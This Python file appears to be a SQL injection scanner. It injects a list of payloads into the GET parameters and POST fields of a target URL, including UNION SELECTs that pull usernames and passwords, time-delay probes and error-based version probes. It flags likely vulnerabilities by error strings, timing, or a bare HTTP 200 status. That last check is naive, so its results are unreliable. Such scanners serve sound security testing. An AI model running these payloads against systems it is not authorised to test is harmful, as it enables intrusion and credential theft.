import os
import time
import requests
from colorama import Fore, Style
from urllib.parse import urlparse, parse_qs

def load_payloads(payload_file=None):
    default_payloads = [
        "'",
        '"',
        "' OR '1'='1",
        '" OR "1"="1',
        "' OR 1=1--",
        "' OR 1=1#",
        "' WAITFOR DELAY '0:0:5'--",
        "' UNION SELECT null,username,password FROM users--",
        "' UNION SELECT 1,@@version,3,4--",
        "' AND 1=CONVERT(int,@@version)--"
    ]
    
    if payload_file and os.path.exists(payload_file):
        with open(payload_file, 'r') as f:
            return [line.strip() for line in f if line.strip()]
    return default_payloads

def detect_db(response_text, payload):
    db_indicators = {
        'MySQL': ['SQL syntax', 'MySQL', 'mysql', 'MySql'],
        'PostgreSQL': ['PostgreSQL', 'postgresql'],
        'SQL Server': ['SQL Server', 'Microsoft SQL', 'ODBC Driver', 'SQLNativeClient'],
        'Oracle': ['Oracle', 'ORA-', 'PLS-', 'TNS:']
    }
    
    for db, indicators in db_indicators.items():
        for indicator in indicators:
            if indicator.lower() in response_text.lower():
                return db
    return None

def test_sqli(url, payloads, time_delay, verbose, output_file):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    
    if not query:
        print(f"{Fore.YELLOW}[!] No query parameters found for SQLi test{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}[*] Testing for SQL Injection in URL parameters...{Style.RESET_ALL}")
    
    for param in query:
        for payload in payloads:
            modified_query = query.copy()
            modified_query[param] = payload
            new_query = "&".join(f"{k}={v[0]}" for k,v in modified_query.items())
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            
            try:
                start_time = time.time()
                response = requests.get(test_url)
                elapsed_time = time.time() - start_time
                
                # Check for time-based SQLi
                if 'WAITFOR DELAY' in payload or 'SLEEP(' in payload:
                    if elapsed_time >= time_delay:
                        msg = f"{Fore.GREEN}[+] Potential time-based SQLi found in parameter: {param}{Style.RESET_ALL}"
                        msg += f"\nPayload: {payload}\nResponse time: {elapsed_time:.2f}s\n"
                        print(msg)
                        
                        if output_file:
                            output_file.write(msg + "\n")
                        continue
                
                # Check for error-based SQLi
                db_type = detect_db(response.text, payload)
                if db_type:
                    msg = f"{Fore.GREEN}[+] Potential {db_type} SQLi found in parameter: {param}{Style.RESET_ALL}"
                    msg += f"\nPayload: {payload}\nDatabase: {db_type}\n"
                    print(msg)
                    
                    if output_file:
                        output_file.write(msg + "\n")
                        
                    if verbose:
                        print(f"{Fore.BLUE}[*] Response (truncated):{Style.RESET_ALL}")
                        print(response.text[:500] + "...\n")
                
                # Check for boolean-based SQLi
                elif 'OR 1=1' in payload and response.status_code == 200:
                    msg = f"{Fore.GREEN}[+] Potential boolean-based SQLi found in parameter: {param}{Style.RESET_ALL}"
                    msg += f"\nPayload: {payload}\n"
                    print(msg)
                    
                    if output_file:
                        output_file.write(msg + "\n")
                        
            except Exception as e:
                print(f"{Fore.RED}[!] Error testing {param}: {e}{Style.RESET_ALL}")

def test_post_sqli(url, data, payloads, time_delay, verbose, output_file):
    if not data:
        return
    
    print(f"{Fore.CYAN}[*] Testing for SQL Injection in POST data...{Style.RESET_ALL}")
    
    # Parse the data string into a dictionary
    data_pairs = [pair.split('=') for pair in data.split('&')]
    post_data = {k: v for k, v in data_pairs}
    
    for param in post_data:
        original_value = post_data[param]
        
        for payload in payloads:
            modified_data = post_data.copy()
            modified_data[param] = payload
            
            try:
                start_time = time.time()
                response = requests.post(url, data=modified_data)
                elapsed_time = time.time() - start_time
                
                # Check for time-based SQLi
                if 'WAITFOR DELAY' in payload or 'SLEEP(' in payload:
                    if elapsed_time >= time_delay:
                        msg = f"{Fore.GREEN}[+] Potential time-based SQLi found in POST parameter: {param}{Style.RESET_ALL}"
                        msg += f"\nPayload: {payload}\nResponse time: {elapsed_time:.2f}s\n"
                        print(msg)
                        
                        if output_file:
                            output_file.write(msg + "\n")
                        continue
                
                # Check for error-based SQLi
                db_type = detect_db(response.text, payload)
                if db_type:
                    msg = f"{Fore.GREEN}[+] Potential {db_type} SQLi found in POST parameter: {param}{Style.RESET_ALL}"
                    msg += f"\nPayload: {payload}\nDatabase: {db_type}\n"
                    print(msg)
                    
                    if output_file:
                        output_file.write(msg + "\n")
                        
                    if verbose:
                        print(f"{Fore.BLUE}[*] Response (truncated):{Style.RESET_ALL}")
                        print(response.text[:500] + "...\n")
                
                # Check for boolean-based SQLi
                elif 'OR 1=1' in payload and response.status_code == 200:
                    msg = f"{Fore.GREEN}[+] Potential boolean-based SQLi found in POST parameter: {param}{Style.RESET_ALL}"
                    msg += f"\nPayload: {payload}\n"
                    print(msg)
                    
                    if output_file:
                        output_file.write(msg + "\n")
                        
            except Exception as e:
                print(f"{Fore.RED}[!] Error testing {param}: {e}{Style.RESET_ALL}")

def scan(url, payload_file=None, post_data=None, time_delay=5, verbose=False, output_file=None):
    payloads = load_payloads(payload_file)
    
    test_sqli(url, payloads, time_delay, verbose, output_file)
    
    if post_data:
        test_post_sqli(url, post_data, payloads, time_delay, verbose, output_file)